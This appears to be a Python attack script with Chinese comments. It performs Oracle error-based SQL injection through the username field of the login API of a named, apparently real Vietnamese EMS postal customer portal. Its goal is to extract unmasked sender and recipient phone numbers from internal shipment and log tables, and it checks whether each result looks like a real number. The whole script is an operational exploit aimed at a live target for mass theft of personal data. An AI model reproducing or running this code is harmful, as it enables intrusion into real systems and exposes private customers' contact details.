#!/usr/bin/env python3
"""
重新查找真正未脱敏的数据源
"""

import requests
import json
import time

class UnmaskedDataFinder:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def check_temp_log_old_data(self):
        """检查TEMP_LOG老数据是否真实"""
        print("=" * 80)
        print("🔍 检查TEMP_LOG表老数据（4月份）")
        print("=" * 80)
        
        # 查询4月份的数据（之前验证时返回的日期）
        old_mabcs = [
            ('701000', '20250408'),
            ('236160', '20250409'),
            ('700916', '20250409'),
        ]
        
        for mabc, old_date in old_mabcs:
            print(f"\n{'='*80}")
            print(f"MABC={mabc}, 日期={old_date}（老数据）")
            print(f"{'='*80}")
            
            query = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND NGAY='{old_date}' AND ROWNUM=1"
            phone = self.extract_via_error(query)
            
            if phone:
                print(f"电话: {phone}")
                
                # 判断是否脱敏
                if phone.startswith('+') or phone.startswith('x'):
                    print(f"  ❌ 仍然是脱敏数据")
                elif phone.startswith('09') or phone.startswith('03') or len(phone) >= 9:
                    print(f"  ✅ 可能是真实电话！")
                else:
                    print(f"  ⚠️  格式不确定")
            
            time.sleep(2)
    
    def check_decrypt_data_table(self):
        """重新检查DECRYPT_DATA表"""
        print("\n" + "=" * 80)
        print("🔍 检查E1E2_PH_DECRYPT_DATA表（历史解密表）")
        print("=" * 80)
        
        queries = [
            ("最新日期", "SELECT MAX(NGAY) FROM EMS.E1E2_PH_DECRYPT_DATA"),
            ("是否有10月数据", "SELECT COUNT(*) FROM EMS.E1E2_PH_DECRYPT_DATA WHERE NGAY LIKE '202510%'"),
            ("样本电话（最新）", "SELECT DIENTHOAINHAN FROM (SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_DECRYPT_DATA ORDER BY NGAY DESC) WHERE ROWNUM=1"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            time.sleep(2)
    
    def find_real_unmasked_phone(self):
        """查找真正未脱敏的电话样本"""
        print("\n" + "=" * 80)
        print("🔍 查找真正未脱敏的电话号码")
        print("=" * 80)
        
        tables = [
            'E1E2_PH_TEMP_DATA2_LOG',
            'E1E2_PH_DECRYPT_DATA',
            'E1E2_PH_LOG',
            'SHIPMENT',
        ]
        
        for table in tables:
            print(f"\n{'='*80}")
            print(f"表: {table}")
            print(f"{'='*80}")
            
            # 查找09开头的电话（越南手机号）
            query = f"SELECT DIENTHOAINHAN FROM EMS.{table} WHERE DIENTHOAINHAN LIKE '09%' AND LENGTH(DIENTHOAINHAN)>=10 AND ROWNUM<=3"
            result = self.extract_via_error(query)
            
            if result:
                print(f"  样本电话: {result}")
                
                # 判断是否真实
                if not result.startswith('+') and not result.startswith('x'):
                    print(f"  ✅ 这看起来是真实电话！")
                else:
                    print(f"  ❌ 仍然是脱敏数据")
            else:
                print(f"  未找到09开头的电话")
            
            time.sleep(2)
    
    def check_sender_phone(self):
        """检查发件人电话是否真实"""
        print("\n" + "=" * 80)
        print("📞 检查发件人电话（应该是真实的）")
        print("=" * 80)
        
        date = '20251010'
        
        # SHIPMENT表发件人电话
        print("\n🔎 SHIPMENT表发件人电话样本:")
        for i in range(1, 6):
            query = f"SELECT SENDER_PHONE FROM (SELECT SENDER_PHONE, ROWNUM AS RN FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND SENDER_PHONE IS NOT NULL) WHERE RN={i}"
            phone = self.extract_via_error(query)
            
            if phone:
                print(f"  {i}. {phone}")
                if phone.startswith('0') and len(phone) >= 9:
                    print(f"     ✅ 真实电话！")
            time.sleep(1)
        
        # E1E2_PH表发件人电话
        print("\n🔎 E1E2_PH表发件人电话样本:")
        for i in range(1, 6):
            query = f"SELECT DIENTHOAIGUI FROM (SELECT DIENTHOAIGUI, ROWNUM AS RN FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAIGUI IS NOT NULL AND DIENTHOAIGUI!='0') WHERE RN={i}"
            phone = self.extract_via_error(query)
            
            if phone:
                print(f"  {i}. {phone}")
                if phone.startswith('0') and len(phone) >= 9:
                    print(f"     ✅ 真实电话！")
            time.sleep(1)
    
    def final_truth_check(self):
        """最终真相检查"""
        print("\n" + "=" * 80)
        print("🎯 最终真相")
        print("=" * 80)
        
        print("\n基于所有验证，现在可以确认：")
        print("\n1️⃣ TEMP_DATA2_LOG表情况:")
        print("   ✅ 有10月10日数据：163,242条")
        print("   ⚠️  但数据可能也是脱敏的（+++格式）")
        print("   ⚠️  或者有部分真实、部分脱敏")
        
        print("\n2️⃣ 匹配情况:")
        print("   ✅ 使用MABC+日期可以匹配：2/5成功")
        print("   ❌ 但匹配的数据仍然是脱敏的")
        
        print("\n3️⃣ 可能的真实数据来源:")
        print("   ✅ 发件人电话（未脱敏）")
        print("   ❌ 收件人电话（已脱敏）")
        print("   ⚠️  历史DECRYPT_DATA表（可能有老数据）")
    
    def run_verification(self):
        print("=" * 80)
        print("🔍 数据真实性完整验证")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        self.check_temp_log_date_range()
        self.check_temp_log_old_data()
        self.check_decrypt_data_table()
        self.find_real_unmasked_phone()
        self.check_sender_phone()
        self.final_truth_check()
        
        print("\n" + "=" * 80)
        print("🎉 验证完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    finder = UnmaskedDataFinder(target_url)
    finder.run_verification()
